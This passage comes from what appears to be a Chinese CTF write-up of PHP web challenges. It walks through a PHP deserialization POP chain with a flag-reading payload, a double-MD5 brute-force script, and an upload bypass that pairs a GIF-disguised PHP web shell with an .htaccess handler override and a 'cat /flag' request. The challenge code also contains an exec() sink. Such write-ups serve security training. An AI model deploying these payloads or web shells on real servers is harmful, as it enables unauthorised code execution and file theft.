class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warlord</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;fruit4;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit5-&gt;<span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Samurai</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit6</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit7</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$long</span> = @<span class="variable language_">$this</span>-&gt;fruit6-&gt;<span class="title function_ invoke__">add</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$long</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fruit7-&gt;tt2) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;xxx are the best!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mystery</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$day1</span>, <span class="variable">$day2</span>) &#123;</span><br><span class="line">            <span class="variable">$day3</span> = <span class="keyword">new</span> <span class="variable">$day2</span>(<span class="variable">$day1</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$day3</span> <span class="keyword">as</span> <span class="variable">$day4</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$day4</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Princess</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$fruit9</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;The time spent with xxx is my happiest time&quot;</span> . <span class="variable language_">$this</span>-&gt;fruit9;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>, <span class="variable">$func</span> . <span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Philosopher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit11</span>=<span class="string">&quot;sr22kaDugamdwTPhG5zU&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;fruit11)) == <span class="number">666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;fruit10-&gt;hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessTwo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hiddenVar</span> = <span class="string">&quot;123123&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hiddenVar = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;hiddenVar;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warrior</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit12</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fruit13</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fruit13 == <span class="string">&quot;xxx&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;fruit12);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessThree</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dummyVar</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessFour</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lalala</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hehe&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;GHCTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;GHCTF&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>PHP反序列化，构造pop链</strong><br />介绍一下出现的魔法函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__construct 类的构造函数，在类实例化对象时自动调用构造函数</span><br><span class="line">__destruct  类的析构函数，在对象销毁之前自动调用析构函数</span><br><span class="line">__toString  当使用<span class="keyword">echo</span>或<span class="keyword">print</span>输出对象将对象转化为字符串形式时，会调用<span class="title function_ invoke__">__toString</span>()方法</span><br><span class="line">__get   当访问一个对象的不存在或不可访问的属性时自动调用，传递属性名作为参数</span><br><span class="line">__call  调用不存在或不可见的成员方法时，PHP会先调用<span class="title function_ invoke__">__call</span>()方法来存储方法名及其参数</span><br><span class="line"><span class="title function_ invoke__">__set</span>(<span class="variable">$property</span>, <span class="variable">$value</span>)  当给一个对象的不存在或不可访问(<span class="keyword">private</span>修饰)的属性赋值时自动调用，传递属性名和属性值作为参数</span><br><span class="line">__invoke    当将一个对象作为函数进行调用时自动调用</span><br></pre></td></tr></table></figure><p>发现了<strong>原生类</strong>，<code>new $day2($day1)</code>，同时发现了<strong>遍历函数foreach()</strong>，直接借助<a href="https://www.anquanke.com/post/id/284901">DirectoryIterator类</a>进行<strong>目录遍历</strong>，然后就是<strong>SplFileObject类</strong>读取文件，其他能构造恶意代码的地方没找到</p><p>有了这个突破点，我们就可以逆回去，<strong>向上构造</strong>，看看哪个类可以触发<code>__get()</code>，发现<strong>Philosopher</strong>有个<strong>hey属性</strong>是<strong>不存在</strong>的，那么现在要触发的是<code>__invoke()</code>，一般找的都是<strong>return xxx();</strong>，有两个，就<code>CherryBlossom</code>吧</p><p>pop链为：<strong>CherryBlossom:__destruct()-&gt;CherryBlossom::__toString()-&gt;Philosopher::__invoke()-&gt;Mystery::__get()</strong></p><p><a href="https://www.cnblogs.com/-mo-/p/11582424.html">双重MD5绕过</a>，<strong>php弱比较</strong>中会截取字符串的数字，直至遇到字母截止，比如’11e33’，就会被读取为11，然后进行比较，改一下这个<code>py2</code>的脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">CHARS = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp_md5</span>(<span class="params">substr, stop_event, str_len, start=<span class="number">0</span>, size=<span class="number">20</span></span>):</span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        rnds = <span class="string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size))</span><br><span class="line">        value1 = hashlib.md5(rnds.encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> value1[start: start+str_len] == substr:</span><br><span class="line">            <span class="comment"># print(rnds)</span></span><br><span class="line">            <span class="comment"># stop_event.set()</span></span><br><span class="line">            <span class="comment"># 碰撞双md5</span></span><br><span class="line">            value2 = hashlib.md5(value1.encode()).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> value2[start: start+str_len] == substr:</span><br><span class="line">                <span class="built_in">print</span>(rnds + <span class="string">&quot;=&gt;&quot;</span> + value1 + <span class="string">&quot;=&gt;&quot;</span> + value2 + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                stop_event.<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    substr = <span class="string">&#x27;666&#x27;</span></span><br><span class="line">    start_pos = <span class="number">0</span></span><br><span class="line">    str_len = <span class="built_in">len</span>(substr)</span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,</span><br><span class="line">                                         stop_event, str_len, start_pos))</span><br><span class="line">                 <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></figure><p>可以跑得一个，<strong>O7it1qaAgBbfAL9OVPyO</strong></p><p>至于怎么给<code>day1,day2</code>赋值，<a href="https://www.php.net/manual/zh/function.array-walk.php">官方文档</a>有提及的，涉及到回调处理，<code>day1</code>为值，<code>day2</code>为键</p><p>为了减少代码，其实可以只保留需要的属性即可，效果是一样的，而且出题人居然塞了这么多无用的类进来，晕</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CherryBlossom</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mystery</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Philosopher</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit11</span> = <span class="string">&quot;O7it1qaAgBbfAL9OVPyO&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">CherryBlossom</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;fruit1 = <span class="keyword">new</span> <span class="title class_">CherryBlossom</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;fruit1-&gt;fruit2 = <span class="keyword">new</span> <span class="title class_">Philosopher</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;fruit1-&gt;fruit2-&gt;fruit10 = <span class="keyword">new</span> <span class="title class_">Mystery</span>();</span><br><span class="line"><span class="comment"># $a-&gt;fruit1-&gt;fruit2-&gt;fruit10-&gt;DirectoryIterator = &quot;glob:///*&quot;;</span></span><br><span class="line"><span class="variable">$a</span>-&gt;fruit1-&gt;fruit2-&gt;fruit10-&gt;<span class="built_in">SplFileObject</span> = <span class="string">&quot;/flag44545615441084&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h2 id="upupup"><a class="markdownIt-Anchor" href="#upupup"></a> UPUPUP</h2><p>尝试了一下，题目对文件后缀和文件内容进行了过滤，然后上传一张<code>gif</code>的时候发现，<code>GIF89a</code>可以绕过检测</p><p>然后我们也可以知道题目用的是<strong>Apache服务器</strong>，再上传一个<code>.htaccess</code>使其按<strong>PHP文件解析</strong></p><p>然后试多几次发现<strong>不限制尺寸</strong>是无法上传的，参考<a href="https://www.anquanke.com/post/id/241147#h2-19">博客</a></p><p><code>.htaccess</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#define width 1337</span></span><br><span class="line"><span class="comment">#define height 1337</span></span><br><span class="line">&lt;FilesMatch <span class="string">&quot;.gif&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p><code>shell.gif</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问<code>/images/shell.gif?1=system(&quot;cat /flag&quot;);</code></p><h2 id="getshell"><a class="markdownIt-Anchor" href="#getshell"></a> GetShell</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConfigLoader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;mode&#x27;</span> =&gt; <span class="string">&#x27;production&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;log_level&#x27;</span> =&gt; <span class="string">&#x27;info&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;max_input_length&#x27;</span> =&gt; <span class="number">100</span>,</span><br><span class="line">            <span class="string">&#x27;min_password_length&#x27;</span> =&gt; <span class="number">8</span>,</span><br><span class="line">            <span class="string">&#x27;allowed_actions&#x27;</span> =&gt; [<span class="string">&#x27;run&#x27;</span>, <span class="string">&#x27;debug&#x27;</span>, <span class="string">&#x27;generate&#x27;</span>]</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;config[<span class="variable">$key</span>] ?? <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logLevel</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$logLevel</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logLevel = <span class="variable">$logLevel</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$message</span>, <span class="variable">$level</span> = <span class="string">&#x27;info&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$level</span> === <span class="variable language_">$this</span>-&gt;logLevel) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;[LOG] <span class="subst">$message</span>\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$users</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logger</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$logger</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger = <span class="variable">$logger</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addUser</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &lt; <span class="number">5</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Username must be at least 5 characters&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>) &lt; <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Password must be at least 8 characters&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;users[<span class="variable">$username</span>] = <span class="title function_ invoke__">password_hash</span>(<span class="variable">$password</span>, PASSWORD_BCRYPT);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;User <span class="subst">$username</span> added&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User <span class="subst">$username</span> added&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">authenticate</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;users[<span class="variable">$username</span>]) &amp;&amp; <span class="title function_ invoke__">password_verify</span>(<span class="variable">$password</span>, <span class="variable">$this</span>-&gt;users[<span class="variable">$username</span>])) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;User <span class="subst">$username</span> authenticated&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;User <span class="subst">$username</span> authenticated&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Authentication failed&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StringUtils</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitize</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$input</span>, ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">generateRandomString</span>(<span class="params"><span class="variable">$length</span> = <span class="number">10</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="variable">$x</span> = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>, <span class="title function_ invoke__">ceil</span>(<span class="variable">$length</span> / <span class="title function_ invoke__">strlen</span>(<span class="variable">$x</span>)))), <span class="number">1</span>, <span class="variable">$length</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InputValidator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$maxLength</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$maxLength</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;maxLength = <span class="variable">$maxLength</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$input</span>) &gt; <span class="variable language_">$this</span>-&gt;maxLength) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Input exceeds maximum length of <span class="subst">&#123;$this-&gt;maxLength&#125;</span> characters&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CommandExecutor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logger</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$logger</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger = <span class="variable">$logger</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$input</span>, <span class="string">&#x27; &#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;Invalid input: space detected&quot;</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;No spaces allowed&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$input</span>, <span class="variable">$output</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;Result: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">implode</span>(<span class="string">&quot;\n&quot;</span>, <span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ActionHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logger</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$executor</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$config</span>, <span class="variable">$logger</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = <span class="variable">$config</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger = <span class="variable">$logger</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;executor = <span class="keyword">new</span> <span class="title class_">CommandExecutor</span>(<span class="variable">$logger</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"><span class="variable">$action</span>, <span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$action</span>, <span class="variable">$this</span>-&gt;config-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;allowed_actions&#x27;</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid action&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;run&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$validator</span> = <span class="keyword">new</span> <span class="title class_">InputValidator</span>(<span class="variable language_">$this</span>-&gt;config-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;max_input_length&#x27;</span>));</span><br><span class="line">            <span class="variable">$validationResult</span> = <span class="variable">$validator</span>-&gt;<span class="title function_ invoke__">validate</span>(<span class="variable">$input</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$validationResult</span> !== <span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$validationResult</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;executor-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$input</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$action</span> === <span class="string">&#x27;debug&#x27;</span>) &#123;</span><br><span 